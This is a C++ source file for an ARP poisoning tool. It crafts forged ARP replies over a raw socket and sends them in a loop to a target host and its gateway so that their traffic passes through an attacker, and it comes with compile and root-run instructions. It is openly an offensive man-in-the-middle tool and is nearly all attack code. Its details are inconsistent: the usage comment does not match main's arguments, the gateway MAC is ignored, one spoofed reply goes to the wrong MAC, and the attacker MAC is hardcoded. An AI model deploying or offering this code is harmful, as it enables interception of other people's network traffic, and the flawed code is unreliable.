// Compile: g++ -o arp_poison arp_poison.cpp
// Run: sudo ./arp_poison <target_ip> <gateway_ip> <interface>
// Requires: root privileges, libpcap optional

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <unistd.h>
#include <thread>
#include <atomic>

class ARPPoisoner {
private:
    int sock;
    std::string interface;
    std::atomic<bool> running{false};
    
    struct ether_header* eth;
    struct ether_arp* arp;
    
public:
    ARPPoisoner(const std::string& iface) : interface(iface) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(interface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        
        if (bind(sock, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
            perror("bind");
            exit(1);
        }
    }
    
    void sendARP(const char* srcIP, const char* srcMAC,
                 const char* dstIP, const char* dstMAC) {
        char packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        // Ethernet header
        sscanf(dstMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &eth->ether_dhost[0], &eth->ether_dhost[1], &eth->ether_dhost[2],
               &eth->ether_dhost[3], &eth->ether_dhost[4], &eth->ether_dhost[5]);
        sscanf(srcMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &eth->ether_shost[0], &eth->ether_shost[1], &eth->ether_shost[2],
               &eth->ether_shost[3], &eth->ether_shost[4], &eth->ether_shost[5]);
        eth->ether_type = htons(ETH_P_ARP);
        
        // ARP header
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        sscanf(srcMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &arp->arp_sha[0], &arp->arp_sha[1], &arp->arp_sha[2],
               &arp->arp_sha[3], &arp->arp_sha[4], &arp->arp_sha[5]);
        inet_pton(AF_INET, srcIP, arp->arp_spa);
        
        sscanf(dstMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &arp->arp_tha[0], &arp->arp_tha[1], &arp->arp_tha[2],
               &arp->arp_tha[3], &arp->arp_tha[4], &arp->arp_tha[5]);
        inet_pton(AF_INET, dstIP, arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(interface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void poison(const char* targetIP, const char* targetMAC,
                const char* gatewayIP, const char* attackerMAC) {
        running = true;
        while (running) {
            sendARP(gatewayIP, attackerMAC, targetIP, targetMAC);
            sendARP(targetIP, attackerMAC, gatewayIP, targetMAC);
            usleep(2000000); // 2 seconds
        }
    }
    
    void stop() { running = false; }
    
    ~ARPPoisoner() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_mac> <gateway_ip> <gateway_mac> <interface>\n";
        return 1;
    }
    ARPPoisoner poisoner(argv[5]);
    poisoner.poison(argv[1], argv[2], argv[3], "00:11:22:33:44:55");
    return 0;
}